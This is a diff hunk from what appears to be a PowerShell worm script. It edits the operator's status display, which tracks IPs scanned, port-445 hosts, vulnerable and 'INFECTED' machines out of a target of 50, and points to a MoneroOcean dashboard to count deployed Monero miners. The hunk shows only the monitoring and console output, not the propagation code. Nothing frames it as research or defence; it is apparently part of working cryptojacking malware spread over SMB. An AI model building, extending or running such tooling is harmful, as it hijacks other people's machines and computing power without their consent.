@@ -1160,7 +1160,7 @@ Write-Host "  Run this in another terminal to watch live progress:" -ForegroundC
 Write-Host ""
 Write-Host '    while ($true) { Clear-Host; $s = Get-Content "C:\ProgramData\MF\status.json" -Raw | ConvertFrom-Json; Write-Host "  WORM LIVE STATUS - $(Get-Date -Format "HH:mm:ss")" -ForegroundColor Cyan; Write-Host "  =================================" -ForegroundColor Cyan; Write-Host "  IPs Scanned:   $($s.scanned)" -ForegroundColor White; Write-Host "  Port 445 Open: $($s.open_445)" -ForegroundColor Green; Write-Host "  Vulnerable:    $($s.vulnerable)" -ForegroundColor Yellow; Write-Host "  INFECTED:      $($s.infected) / 50" -ForegroundColor Magenta; Write-Host "  Failed:        $($s.failed)" -ForegroundColor Red; Write-Host "  Last IP:       $($s.last_ip)" -ForegroundColor Gray; Write-Host "  Action:        $($s.last_action)" -ForegroundColor Gray; Write-Host "  =================================" -ForegroundColor Cyan; Start-Sleep 2 }'
 Write-Host ""
-Write-Host "  Or check MoneroOcean dashboard for live miner count:" -ForegroundColor Gray
+Write-Host "  Or check MoneroOcean dashboard for live miner count:"
 Write-Host "  https://moneroocean.stream" -ForegroundColor Cyan
 Write-Host "  ====================================================" -ForegroundColor Magenta
 Write-Host ""
